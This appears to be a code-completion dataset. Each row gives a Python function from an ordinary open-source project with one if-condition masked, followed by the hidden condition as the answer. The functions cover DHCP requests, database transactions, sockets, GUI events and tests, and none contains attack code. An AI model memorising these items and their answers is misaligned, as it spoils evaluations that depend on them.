4873,"def req(s, poll, msg, expect):<tab>do_req = True<tab>xid = None<tab>while True:<tab><tab># get transaction id<tab><tab>if do_req:<tab><tab><tab>xid = s.put(msg)[""xid""]<tab><tab># wait for response<tab><tab>events = poll.poll(2)<tab><tab>for (fd, event) in events:<tab><tab><tab>response = s.get()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>do_req = False<tab><tab><tab><tab>continue<tab><tab><tab>if response[""options""][""message_type""] != expect:<tab><tab><tab><tab>raise Exception(""DHCP protocol error"")<tab><tab><tab>return response<tab><tab>do_req = True","if response [ ""xid"" ] != xid :",174
4874,"def close(self, invalidate=False):<tab>self.session.transaction = self._parent<tab>if self._parent is None:<tab><tab>for connection, transaction, autoclose in set(self._connections.values()):<tab><tab><tab>if invalidate:<tab><tab><tab><tab>connection.invalidate()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>connection.close()<tab><tab><tab>else:<tab><tab><tab><tab>transaction.close()<tab>self._state = CLOSED<tab>self.session.dispatch.after_transaction_end(self.session, self)<tab>if self._parent is None:<tab><tab>if not self.session.autocommit:<tab><tab><tab>self.session.begin()<tab>self.session = None<tab>self._connections = None",if autoclose :,172
4875,"def visit_loop(self):<tab>v = self.vS.top_front()<tab>i = self.iS.top_front()<tab>num_edges = len(self.graph[v].edges)<tab># Continue traversing out-edges until none left.<tab>while i <= num_edges:<tab><tab># Continuation<tab><tab>if i > 0:<tab><tab><tab># Update status for previously traversed out-edge<tab><tab><tab>self.finish_edge(v, i - 1)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>i += 1<tab># Finished traversing out edges, update component info<tab>self.finish_visiting(v)","if i < num_edges and self . begin_edge ( v , i ) :",167
4876,"def get_objects(self):<tab>list_type, id, handles, timestamp = self._obj_list<tab>retval = []<tab>for (target, handle) in handles:<tab><tab>_class = map2class(target)<tab><tab><IF-STMT><tab><tab><tab>obj = _class(self._dbstate, pickle.dumps((target, id, handle, timestamp)))<tab><tab><tab>if obj:<tab><tab><tab><tab>retval.append(obj)<tab>return retval",if _class :,108
4877,"def __init__(self, config_lists):<tab>self.lens = len(config_lists)<tab>self.spaces = []<tab>for config_list in config_lists:<tab><tab>if isinstance(config_list, tuple):<tab><tab><tab>key, config = config_list<tab><tab><IF-STMT><tab><tab><tab>key = config_list<tab><tab><tab>config = None<tab><tab>else:<tab><tab><tab>raise NotImplementedError(<tab><tab><tab><tab>""the type of config is Error!!! Please check the config information. Receive the type of config is {}"".format(<tab><tab><tab><tab><tab>type(config_list)<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab>self.spaces.append(self._get_single_search_space(key, config))<tab>self.init_tokens()","elif isinstance ( config_list , str ) :",186
4878,"def fieldset_string_to_field(fieldset_dict, model):<tab>if isinstance(fieldset_dict[""fields""], tuple):<tab><tab>fieldset_dict[""fields""] = list(fieldset_dict[""fields""])<tab>i = 0<tab>for dict_field in fieldset_dict[""fields""]:<tab><tab><IF-STMT><tab><tab><tab>fieldset_dict[""fields""][i] = model._meta.get_field_by_name(dict_field)[0]<tab><tab>elif isinstance(dict_field, list) or isinstance(dict_field, tuple):<tab><tab><tab>dict_field[1][""recursive""] = True<tab><tab><tab>fieldset_string_to_field(dict_field[1], model)<tab><tab>i += 1","if isinstance ( dict_field , string_types ) :",179
4879,"def _get_directories(config):<tab>for directory in config[""dump_directories""]:<tab><tab>for dname in sorted(glob.glob(os.path.join(directory, ""*[Aa]*[Xx][XxYy23]""))):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield dname",if os . path . isdir ( dname ) :,79
4880,"def process_event(self, event):<tab>super().process_event(event)<tab>if event.type == pygame.USEREVENT:<tab><tab><IF-STMT><tab><tab><tab>self.input_op(event.ui_object_id[-1])<tab><tab><tab>return True",if event . user_type == pygame_gui . UI_BUTTON_PRESSED :,80
4881,"def _restore_std_streams(self):<tab>stdout = sys.stdout.getvalue()<tab>stderr = sys.stderr.getvalue()<tab>close = [sys.stdout, sys.stderr]<tab>sys.stdout = sys.__stdout__<tab>sys.stderr = sys.__stderr__<tab>for stream in close:<tab><tab>stream.close()<tab>if stdout and stderr:<tab><tab>if not stderr.startswith((""*TRACE*"", ""*DEBUG*"", ""*INFO*"", ""*HTML*"", ""*WARN*"")):<tab><tab><tab>stderr = ""*INFO* %s"" % stderr<tab><tab><IF-STMT><tab><tab><tab>stdout += ""\n""<tab>return self._handle_binary_result(stdout + stderr)","if not stdout . endswith ( ""\n"" ) :",159
4882,"def _get_attachments(self):<tab>if self._attachments is None:<tab><tab>alist = []<tab><tab>for a in self._message.get_attachments():<tab><tab><tab>alist.append((AttachmentWidget(a), None))<tab><tab><IF-STMT><tab><tab><tab>self._attachments = SimpleTree(alist)<tab>return self._attachments",if alist :,79
4883,"def __getattr__(self, name):<tab># if the aval property raises an AttributeError, gets caught here<tab>assert skip_checks or name != ""aval""<tab>try:<tab><tab>attr = getattr(self.aval, name)<tab>except KeyError as err:<tab><tab>raise AttributeError(<tab><tab><tab>""{} has no attribute {}"".format(self.__class__.__name__, name)<tab><tab>) from err<tab>else:<tab><tab>t = type(attr)<tab><tab>if t is aval_property:<tab><tab><tab>return attr.fget(self)<tab><tab><IF-STMT><tab><tab><tab>return types.MethodType(attr.fun, self)<tab><tab>else:<tab><tab><tab>return attr",elif t is aval_method :,165
4884,"def _find_first_unescaped(dn, char, pos):<tab>while True:<tab><tab>pos = dn.find(char, pos)<tab><tab><IF-STMT><tab><tab><tab>break  # no char found<tab><tab>if pos > 0 and dn[pos - 1] != ""\\"":  # unescaped char<tab><tab><tab>break<tab><tab>elif pos > 1 and dn[pos - 1] == ""\\"":  # may be unescaped<tab><tab><tab>escaped = True<tab><tab><tab>for c in dn[pos - 2 : 0 : -1]:<tab><tab><tab><tab>if c == ""\\"":<tab><tab><tab><tab><tab>escaped = not escaped<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>break<tab><tab><tab>if not escaped:<tab><tab><tab><tab>break<tab><tab>pos += 1<tab>return pos",if pos == - 1 :,181
4885,"def test_synopsis(self):<tab>self.addCleanup(unlink, TESTFN)<tab>for encoding in (""ISO-8859-1"", ""UTF-8""):<tab><tab>with open(TESTFN, ""w"", encoding=encoding) as script:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""#coding: {}"".format(encoding), file=script)<tab><tab><tab>print('""""""line 1: h\xe9', file=script)<tab><tab><tab>print('line 2: hi""""""', file=script)<tab><tab>synopsis = pydoc.synopsis(TESTFN, {})<tab><tab>self.assertEqual(synopsis, ""line 1: h\xe9"")","if encoding != ""UTF-8"" :",148
4886,"def qualify(x):<tab>parts = x.split("";"", 1)<tab>if len(parts) == 2:<tab><tab>match = re.match(r""(^|;)q=(0(\.\d{,3})?|1(\.0{,3})?)(;|$)"", parts[1])<tab><tab><IF-STMT><tab><tab><tab>return parts[0].strip(), float(match.group(2))<tab>return parts[0].strip(), 1",if match :,102
4887,"def getEndpoints(self):<tab>endpoints = self.endpoints[:]<tab>for i in range(len(endpoints)):<tab><tab>ep = endpoints[i]<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(""Not an Endpoint subclass"")<tab><tab>endpoints[i] = ep(self, self.master)<tab>return endpoints","if not issubclass ( ep , Endpoint ) :",81
4888,"def __getitem__(self, index):<tab>if cfg.RPN.ENABLED:<tab><tab>return self.get_rpn_sample(index)<tab>elif cfg.RCNN.ENABLED:<tab><tab><IF-STMT><tab><tab><tab>if cfg.RCNN.ROI_SAMPLE_JIT:<tab><tab><tab><tab>return self.get_rcnn_sample_jit(index)<tab><tab><tab>else:<tab><tab><tab><tab>return self.get_rcnn_training_sample_batch(index)<tab><tab>else:<tab><tab><tab>return self.get_proposal_from_file(index)<tab>else:<tab><tab>raise NotImplementedError","if self . mode == ""TRAIN"" :",144
4889,"def test_data_path(self, filename):<tab>repository_dir = self._repository_dir<tab>test_data = None<tab>if repository_dir:<tab><tab>return self.__walk_test_data(dir=repository_dir, filename=filename)<tab>else:<tab><tab>if self.tool_dir:<tab><tab><tab>tool_dir = self.tool_dir<tab><tab><tab><IF-STMT><tab><tab><tab><tab>tool_dir = os.path.dirname(self.tool_dir)<tab><tab><tab>test_data = self.__walk_test_data(tool_dir, filename=filename)<tab>if not test_data:<tab><tab>test_data = self.app.test_data_resolver.get_filename(filename)<tab>return test_data","if isinstance ( self , DataManagerTool ) :",181
4890,"def generate_forwards(cls, attrs):<tab># forward functions of _forwards<tab>for attr_name, attr in cls._forwards.__dict__.items():<tab><tab>if attr_name.startswith(""_"") or attr_name in attrs:<tab><tab><tab>continue<tab><tab>if isinstance(attr, property):<tab><tab><tab>cls._forward.append(attr_name)<tab><tab><IF-STMT><tab><tab><tab>wrapper = _forward_factory(cls, attr_name, attr)<tab><tab><tab>setattr(cls, attr_name, wrapper)<tab><tab>else:<tab><tab><tab>raise TypeError(attr_name, type(attr))","elif isinstance ( attr , types . FunctionType ) :",146
4891,"def summary(result):<tab>if not self.options.metadata_to_dict:<tab><tab><IF-STMT><tab><tab><tab>pprint(Fore.CYAN + result[""title""] + Fore.RESET)<tab><tab><tab>pprint(<tab><tab><tab><tab>Fore.CYAN<tab><tab><tab><tab>+ Style.DIM<tab><tab><tab><tab>+ result[""written_at""]<tab><tab><tab><tab>+ Style.RESET_ALL<tab><tab><tab><tab>+ Fore.RESET<tab><tab><tab>)<tab><tab><tab>pprint(result[""body""])<tab><tab>writer.write(""@title:"" + result[""title""])<tab><tab>writer.write(""@written_at:"" + result[""written_at""])<tab><tab>writer.write(""@body:"" + result[""body""])<tab>else:<tab><tab>if self.options.verbose:<tab><tab><tab>pprint(result)<tab><tab>writer.write(result)",if self . options . verbose :,196
4892,"def visit_StringConstant(self, node: qlast.StringConstant) -> None:<tab>if not _NON_PRINTABLE_RE.search(node.value):<tab><tab>for d in (""'"", '""', ""$$""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if ""\\"" in node.value and d != ""$$"":<tab><tab><tab><tab><tab>self.write(""r"", d, node.value, d)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>self.write(d, node.value, d)<tab><tab><tab><tab>return<tab><tab>self.write(edgeql_quote.dollar_quote_literal(node.value))<tab><tab>return<tab>self.write(repr(node.value))",if d not in node . value :,170
4893,"def get_sql_date_trunc(col, db=""default"", grouper=""hour""):<tab>conn = connections[db]<tab>engine = get_db_engine(db)<tab># TODO: does extract work for sqlite?<tab>if engine.startswith(""oracle""):<tab><tab>method = DATE_TRUNC_GROUPERS[""oracle""].get(<tab><tab><tab>grouper, DATE_TRUNC_GROUPERS[""default""][grouper]<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>col = '""%s""' % col.upper()<tab>else:<tab><tab>method = DATE_TRUNC_GROUPERS[""default""][grouper]<tab>return conn.ops.date_trunc_sql(method, col)","if '""' not in col :",164
4894,"def req(s, poll, msg, expect):<tab>do_req = True<tab>xid = None<tab>while True:<tab><tab># get transaction id<tab><tab>if do_req:<tab><tab><tab>xid = s.put(msg)[""xid""]<tab><tab># wait for response<tab><tab>events = poll.poll(2)<tab><tab>for (fd, event) in events:<tab><tab><tab>response = s.get()<tab><tab><tab>if response[""xid""] != xid:<tab><tab><tab><tab>do_req = False<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise Exception(""DHCP protocol error"")<tab><tab><tab>return response<tab><tab>do_req = True","if response [ ""options"" ] [ ""message_type"" ] != expect :",174
4895,"def __init__(self, f):<tab>self._refs = {}<tab>self._peeled = {}<tab>for line in f.readlines():<tab><tab>sha, name = line.rstrip(b""\n"").split(b""\t"")<tab><tab><IF-STMT><tab><tab><tab>name = name[:-3]<tab><tab><tab>if not check_ref_format(name):<tab><tab><tab><tab>raise ValueError(""invalid ref name %r"" % name)<tab><tab><tab>self._peeled[name] = sha<tab><tab>else:<tab><tab><tab>if not check_ref_format(name):<tab><tab><tab><tab>raise ValueError(""invalid ref name %r"" % name)<tab><tab><tab>self._refs[name] = sha",if name . endswith ( ANNOTATED_TAG_SUFFIX ) :,171
4896,"def get_defines(clang_output):<tab>import re<tab>defines = []<tab>for line in output.splitlines():<tab><tab>m = re.search(r""#define ([\w()]+) (.+)"", line)<tab><tab><IF-STMT><tab><tab><tab>defines.append(""-D{}={}"".format(m.group(1), m.group(2)))<tab><tab>else:<tab><tab><tab>m = re.search(r""#define (\w+)"", line)<tab><tab><tab>if m is not None:<tab><tab><tab><tab>defines.append(""-D{}"".format(m.group(1)))<tab>_log.debug(""Got defines: %s"", defines)<tab>return defines",if m is not None :,155
4897,"def clean_rcs_keywords(paragraph, keyword_substitutions):<tab>if len(paragraph) == 1 and isinstance(paragraph[0], nodes.Text):<tab><tab>textnode = paragraph[0]<tab><tab>for pattern, substitution in keyword_substitutions:<tab><tab><tab>match = pattern.search(textnode.data)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>textnode.data = pattern.sub(substitution, textnode.data)<tab><tab><tab><tab>return",if match :,107
4898,"def reorder_incremental_state(<tab>self, incremental_state: Dict[str, Dict[str, Optional[Tensor]]], new_order):<tab>""""""Reorder buffered internal state (for incremental generation).""""""<tab>input_buffer = self._get_input_buffer(incremental_state)<tab>if input_buffer is not None:<tab><tab>for k in input_buffer.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>input_buffer[k] = input_buffer[k].index_select(0, new_order)<tab><tab>incremental_state = self._set_input_buffer(incremental_state, input_buffer)<tab>return incremental_state",if input_buffer [ k ] is not None :,156
4899,"def render(cls) -> str:<tab>buf = render_utils.RenderBuffer()<tab>buf.write(f""struct {cls.__name__} {{"")<tab>with buf.indent():<tab><tab>for fieldname, field in cls._fields.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>buf.write_comment(field.doc)<tab><tab><tab>field.render_field(fieldname, buf)<tab><tab><tab>buf.newline()<tab>if buf.lastline() == """":<tab><tab>buf.popline()<tab>buf.write(""};"")<tab>return str(buf)",if field . doc :,134
4900,"def prepare_text(text, style):<tab>body = []<tab>for fragment, sty in parse_tags(text, style, subs.styles):<tab><tab>fragment = fragment.replace(r""\h"", "" "")<tab><tab>fragment = fragment.replace(r""\n"", ""\n"")<tab><tab>fragment = fragment.replace(r""\N"", ""\n"")<tab><tab><IF-STMT><tab><tab><tab>fragment = ""<i>%s</i>"" % fragment<tab><tab>if sty.underline:<tab><tab><tab>fragment = ""<u>%s</u>"" % fragment<tab><tab>if sty.strikeout:<tab><tab><tab>fragment = ""<s>%s</s>"" % fragment<tab><tab>if sty.drawing:<tab><tab><tab>raise ContentNotUsable<tab><tab>body.append(fragment)<tab>return re.sub(""\n+"", ""\n"", """".join(body).strip())",if sty . italic :,198
4901,"def _show_warnings(self):<tab>if self._warnings_handled:<tab><tab>return<tab>self._warnings_handled = True<tab>if self._result and (self._result.has_next or not self._result.warning_count):<tab><tab>return<tab>ws = self._get_db().show_warnings()<tab>if ws is None:<tab><tab>return<tab>for w in ws:<tab><tab>msg = w[-1]<tab><tab>if PY2:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>msg = msg.encode(""utf-8"", ""replace"")<tab><tab>warnings.warn(err.Warning(*w[1:3]), stacklevel=4)","if isinstance ( msg , unicode ) :",158
4902,"def scrub_time(self, time):  # used externally to set time by slider scrubbing<tab>debug(""scrub_time: {0}"".format(time))<tab>if time == 0:<tab><tab>self.loop_backward()<tab>elif time == self.timer_duration:<tab><tab>self.loop_forward()<tab>else:  # time in between 0 and duration<tab><tab>if self.timer_status == TIMER_STATUS_STOPPED:<tab><tab><tab>self.timer_status = TIMER_STATUS_PAUSED<tab><tab><IF-STMT><tab><tab><tab>self.timer_status = TIMER_STATUS_PAUSED<tab>self.timer_time = time",elif self . timer_status == TIMER_STATUS_EXPIRED :,163
4903,"def _default_import_run(run, dest, move, copy_resources):<tab>if move:<tab><tab>log.info(""Moving %s"", run.id)<tab><tab><IF-STMT><tab><tab><tab>shutil.copytree(run.path, dest)<tab><tab><tab>util.safe_rmtree(run.path)<tab><tab>else:<tab><tab><tab>shutil.move(run.path, dest)<tab>else:<tab><tab>log.info(""Copying %s"", run.id)<tab><tab>shutil.copytree(run.path, dest, symlinks=not copy_resources)",if copy_resources :,133
4904,"def fn(n):<tab>while n < 3:<tab><tab><IF-STMT><tab><tab><tab>yield ""less than zero""<tab><tab>elif n == 0:<tab><tab><tab>yield ""zero""<tab><tab>elif n == 1:<tab><tab><tab>yield ""one""<tab><tab>else:<tab><tab><tab>yield ""more than one""<tab><tab>n += 1",if n < 0 :,84
4905,"def _check_dep_names(self):<tab>""""""check if user input task_dep or setup_task that doesnt exist""""""<tab># check task-dependencies exist.<tab>for task in self.tasks.values():<tab><tab>for dep in task.task_dep:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>msg = ""%s. Task dependency '%s' does not exist.""<tab><tab><tab><tab>raise InvalidTask(msg % (task.name, dep))<tab><tab>for setup_task in task.setup_tasks:<tab><tab><tab>if setup_task not in self.tasks:<tab><tab><tab><tab>msg = ""Task '%s': invalid setup task '%s'.""<tab><tab><tab><tab>raise InvalidTask(msg % (task.name, setup_task))",if dep not in self . tasks :,176
4906,"def urls():<tab>for scheme in (b""http"", b""https""):<tab><tab>for host in (b""example.com"",):<tab><tab><tab>for port in (None, 100):<tab><tab><tab><tab>for path in (b"""", b""path""):<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>host = host + b"":"" + networkString(str(port))<tab><tab><tab><tab><tab><tab>yield urlunsplit((scheme, host, path, b"""", b""""))",if port is not None :,112
4907,"def split_hashes(cls, line):<tab># type: (S) -> Tuple[S, List[S]]<tab>if ""--hash"" not in line:<tab><tab>return line, []<tab>split_line = line.split()<tab>line_parts = []  # type: List[S]<tab>hashes = []  # type: List[S]<tab>for part in split_line:<tab><tab><IF-STMT><tab><tab><tab>param, _, value = part.partition(""="")<tab><tab><tab>hashes.append(value)<tab><tab>else:<tab><tab><tab>line_parts.append(part)<tab>line = "" "".join(line_parts)<tab>return line, hashes","if part . startswith ( ""--hash"" ) :",159
4908,"def part(p, imaginary):<tab># Represent infinity as 1e1000 and NaN as 1e1000-1e1000.<tab>s = ""j"" if imaginary else """"<tab>try:<tab><tab>if math.isinf(p):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return ""-1e1000"" + s<tab><tab><tab>return ""1e1000"" + s<tab><tab>if math.isnan(p):<tab><tab><tab>return ""(1e1000%s-1e1000%s)"" % (s, s)<tab>except OverflowError:<tab><tab># math.isinf will raise this when given an integer<tab><tab># that's too large to convert to a float.<tab><tab>pass<tab>return repr(p) + s",if p < 0 :,168
4909,"def _build_display_args(self, r):<tab>args = []<tab>if self.RESULT:<tab><tab><IF-STMT><tab><tab><tab>result = [self.RESULT]<tab><tab>else:<tab><tab><tab>result = self.RESULT<tab><tab>for name in result:<tab><tab><tab>value = getattr(r, name)<tab><tab><tab># Displayed offsets should be offset by the base address<tab><tab><tab>if name == ""offset"":<tab><tab><tab><tab>value += self.config.base<tab><tab><tab>args.append(value)<tab>return args",if type ( self . RESULT ) != type ( [ ] ) :,139
4910,"def cell_data_statusicon(column, cell, model, row, data):<tab>""""""Display text with an icon""""""<tab>try:<tab><tab>state = model.get_value(row, data)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>func_last_value[""cell_data_statusicon""] = state<tab><tab>icon = ICON_STATE[state]<tab><tab># Supress Warning: g_object_set_qdata: assertion `G_IS_OBJECT (object)' failed<tab><tab>original_filters = warnings.filters[:]<tab><tab>warnings.simplefilter(""ignore"")<tab><tab>try:<tab><tab><tab>cell.set_property(""pixbuf"", icon)<tab><tab>finally:<tab><tab><tab>warnings.filters = original_filters<tab>except KeyError:<tab><tab>pass","if func_last_value [ ""cell_data_statusicon"" ] == state :",195
4911,"def _para_exploit(self, params, part):<tab>if len(params) == 0:<tab><tab>arr = [""*"", ""config""] + self._configs.keys()<tab><tab>return suggest(arr, part)<tab>if len(params) == 1:<tab><tab>arr = []<tab><tab><IF-STMT><tab><tab><tab>arr = self._configs.keys()<tab><tab>if params[0] == ""*"":<tab><tab><tab>arr = [""stopOnFirst""]<tab><tab>return suggest(arr, part)<tab>return []","if params [ 0 ] == ""config"" :",124
4912,"def send(self, data, flags=0, timeout=timeout_default):<tab>if timeout is timeout_default:<tab><tab>timeout = self.timeout<tab>try:<tab><tab>return self._sock.send(data, flags)<tab>except error as ex:<tab><tab>if ex.args[0] not in _socketcommon.GSENDAGAIN or timeout == 0.0:<tab><tab><tab>raise<tab><tab>sys.exc_clear()<tab><tab>self._wait(self._write_event)<tab><tab>try:<tab><tab><tab>return self._sock.send(data, flags)<tab><tab>except error as ex2:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return 0<tab><tab><tab>raise",if ex2 . args [ 0 ] == EWOULDBLOCK :,175
4913,"def server_decode(self, buf):<tab>if self.has_recv_header:<tab><tab>return (buf, True, False)<tab>self.has_recv_header = True<tab>crc = binascii.crc32(buf) & 0xFFFFFFFF<tab>if crc != 0xFFFFFFFF:<tab><tab>self.has_sent_header = True<tab><tab><IF-STMT><tab><tab><tab>return (b""E"" * 2048, False, False)<tab><tab>return (buf, True, False)<tab># (buffer_to_recv, is_need_decrypt, is_need_to_encode_and_send_back)<tab>return (b"""", False, True)","if self . method == ""random_head"" :",158
4914,"def Decode(self, filedesc):<tab>while True:<tab><tab>chunk = filedesc.Read(4)<tab><tab>if not chunk:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>yield b""NORF""<tab><tab>if chunk == b""THUD"":<tab><tab><tab>yield b""BLARGH""","if chunk == b""QUUX"" :",82
4915,"def decProcess():<tab>while 1:<tab><tab>yield clock.posedge, reset.negedge<tab><tab>if reset == ACTIVE_LOW:<tab><tab><tab>count.next = 0<tab><tab>else:<tab><tab><tab>if enable:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>count.next = n - 1<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>count.next = count - 1",if count == - n :,100
4916,"def set_torrent_path(self, torrent_id, path):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>self.client.core.set_torrent_move_completed_path(torrent_id, path).get()<tab><tab>self.client.core.set_torrent_move_completed(torrent_id, 1).get()<tab>except Exception:<tab><tab>return False<tab>finally:<tab><tab>if self.client:<tab><tab><tab>self.disconnect()<tab>return True",if not self . connect ( ) :,123
4917,"def stale_rec(node, nodes):<tab>if node.abspath() in node.ctx.env[Build.CFG_FILES]:<tab><tab>return<tab>if getattr(node, ""children"", []):<tab><tab>for x in node.children.values():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>stale_rec(x, nodes)<tab>else:<tab><tab>for ext in DYNAMIC_EXT:<tab><tab><tab>if node.name.endswith(ext):<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>if not node in nodes:<tab><tab><tab><tab>if can_delete(node):<tab><tab><tab><tab><tab>Logs.warn(""Removing stale file -> %r"", node)<tab><tab><tab><tab><tab>node.delete()","if x . name != ""c4che"" :",177
4918,"def iterate(self, prod_, rule_):<tab>newProduction = """"<tab>for i in range(len(prod_)):<tab><tab>step = self.production[i]<tab><tab>if step == ""W"":<tab><tab><tab>newProduction = newProduction + self.ruleW<tab><tab><IF-STMT><tab><tab><tab>newProduction = newProduction + self.ruleX<tab><tab>elif step == ""Y"":<tab><tab><tab>newProduction = newProduction + self.ruleY<tab><tab>elif step == ""Z"":<tab><tab><tab>newProduction = newProduction + self.ruleZ<tab><tab>elif step != ""F"":<tab><tab><tab>newProduction = newProduction + step<tab>self.drawLength = self.drawLength * 0.5<tab>self.generations += 1<tab>return newProduction","elif step == ""X"" :",179
4919,"def _get_app_params(self):<tab>params = self.cfg.params.copy()<tab>for key, value in self.__dict__.items():<tab><tab>if key.startswith(""_""):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>params[""parse_console""] = not value<tab><tab>else:<tab><tab><tab>params[key] = value<tab>params[""load_config""] = False<tab>return params","elif key == ""console_parsed"" :",102
4920,"def __setitem__(self, key, value):<tab>if not isinstance(value, PseudoNamespace):<tab><tab>tuple_converted = False<tab><tab>if isinstance(value, dict):<tab><tab><tab>value = PseudoNamespace(value)<tab><tab><IF-STMT><tab><tab><tab>value = list(value)<tab><tab><tab>tuple_converted = True<tab><tab>if isinstance(value, list):<tab><tab><tab>for i, item in enumerate(value):<tab><tab><tab><tab>if isinstance(item, dict) and not isinstance(item, PseudoNamespace):<tab><tab><tab><tab><tab>value[i] = PseudoNamespace(item)<tab><tab><tab>if tuple_converted:<tab><tab><tab><tab>value = tuple(value)<tab>super(PseudoNamespace, self).__setitem__(key, value)","elif isinstance ( value , tuple ) :",175
4921,"def getNextSibling(self, node):<tab>if isinstance(node, tuple):  # Text node<tab><tab>node, key = node<tab><tab>assert key in (""text"", ""tail""), ""Text nodes are text or tail, found %s"" % key<tab><tab>if key == ""text"":<tab><tab><tab># XXX: we cannot use a ""bool(node) and node[0] or None"" construct here<tab><tab><tab># because node[0] might evaluate to False if it has no child element<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return node[0]<tab><tab><tab>else:<tab><tab><tab><tab>return None<tab><tab>else:  # tail<tab><tab><tab>return node.getnext()<tab>return (node, ""tail"") if node.tail else node.getnext()",if len ( node ) :,182
4922,"def star_path(path):<tab>""""""Replace integers and integer-strings in a path with *""""""<tab>path = list(path)<tab>for i, p in enumerate(path):<tab><tab>if isinstance(p, int):<tab><tab><tab>path[i] = ""*""<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>p = p.decode()<tab><tab><tab>if r_is_int.match(p):<tab><tab><tab><tab>path[i] = ""*""<tab>return join_path(path)","if not isinstance ( p , text_type ) :",127
4923,"def ensure_popup_selection(self):<tab>try:<tab><tab>self.__position_at_mouse<tab>except AttributeError:<tab><tab>path, col = self.get_cursor()<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>self.scroll_to_cell(path, col)<tab><tab># ensure current cursor path is selected, just like right-click<tab><tab>selection = self.get_selection()<tab><tab>if not selection.path_is_selected(path):<tab><tab><tab>selection.unselect_all()<tab><tab><tab>selection.select_path(path)<tab><tab>return True",if path is None :,141
4924,"def release(self):<tab>me, lock_count = self.__begin()<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>self._count = count = self._count - 1<tab><tab>if not count:<tab><tab><tab>self._owner = None<tab><tab><tab>self._block.release()<tab>finally:<tab><tab>self.__end(me, lock_count)",if me is None :,92
4925,"def date_match(self, date1, date2):<tab>if date1.is_empty() or date2.is_empty():<tab><tab>return 0<tab>if date1.is_equal(date2):<tab><tab>return 1<tab>if date1.is_compound() or date2.is_compound():<tab><tab>return self.range_compare(date1, date2)<tab>if date1.get_year() == date2.get_year():<tab><tab>if date1.get_month() == date2.get_month():<tab><tab><tab>return 0.75<tab><tab><IF-STMT><tab><tab><tab>return 0.75<tab><tab>else:<tab><tab><tab>return -1<tab>else:<tab><tab>return -1",if not date1 . get_month_valid ( ) or not date2 . get_month_valid ( ) :,189
4926,"def onMinimize(self, sender):<tab>if self._runDialogListener(""onMinimize"") is False:<tab><tab>return<tab>widget = self.child<tab>if widget is not None:<tab><tab><IF-STMT><tab><tab><tab>widget.setVisible(False)<tab><tab><tab>self.setHeight("""")<tab><tab><tab>self.setWidth("""")<tab><tab><tab>if self._maximized:<tab><tab><tab><tab>self._minimized = self._maximized<tab><tab><tab><tab>self._toggleMaximize()<tab><tab><tab>else:<tab><tab><tab><tab>self._minimized = None<tab><tab>else:<tab><tab><tab>if self._minimized is not None:<tab><tab><tab><tab>self._toggleMaximize()<tab><tab><tab>widget.setVisible(True)",if widget . isVisible ( ) :,171
4927,"def instance_reader():<tab>for epoch_index in range(epoch):<tab><tab><IF-STMT><tab><tab><tab>if shuffle_seed is not None:<tab><tab><tab><tab>np.random.seed(shuffle_seed)<tab><tab><tab>np.random.shuffle(examples)<tab><tab>if phase == ""train"":<tab><tab><tab>self.current_train_epoch = epoch_index<tab><tab>for (index, example) in enumerate(examples):<tab><tab><tab>if phase == ""train"":<tab><tab><tab><tab>self.current_train_example = index + 1<tab><tab><tab>feature = self.convert_example(<tab><tab><tab><tab>index, example, self.get_labels(), self.max_seq_len, self.tokenizer<tab><tab><tab>)<tab><tab><tab>instance = self.generate_instance(feature)<tab><tab><tab>yield instance",if shuffle :,189
4928,"def _parse_lines(self, linesource):<tab>""""""Parse lines of text for functions and classes""""""<tab>functions = []<tab>classes = []<tab>for line in linesource:<tab><tab>if line.startswith(""def "") and line.count(""(""):<tab><tab><tab># exclude private stuff<tab><tab><tab>name = self._get_object_name(line)<tab><tab><tab>if not name.startswith(""_""):<tab><tab><tab><tab>functions.append(name)<tab><tab><IF-STMT><tab><tab><tab># exclude private stuff<tab><tab><tab>name = self._get_object_name(line)<tab><tab><tab>if not name.startswith(""_""):<tab><tab><tab><tab>classes.append(name)<tab><tab>else:<tab><tab><tab>pass<tab>functions.sort()<tab>classes.sort()<tab>return functions, classes","elif line . startswith ( ""class "" ) :",185
4929,"def get_folder_version(folder):<tab>f = os.path.join(code_path, folder, ""version.txt"")<tab>try:<tab><tab>with open(f) as fd:<tab><tab><tab>content = fd.read()<tab><tab><tab>p = re.compile(r""([0-9]+)\.([0-9]+)\.([0-9]+)"")<tab><tab><tab>m = p.match(content)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>version = m.group(1) + ""."" + m.group(2) + ""."" + m.group(3)<tab><tab><tab><tab>return version<tab>except:<tab><tab>return False",if m :,151
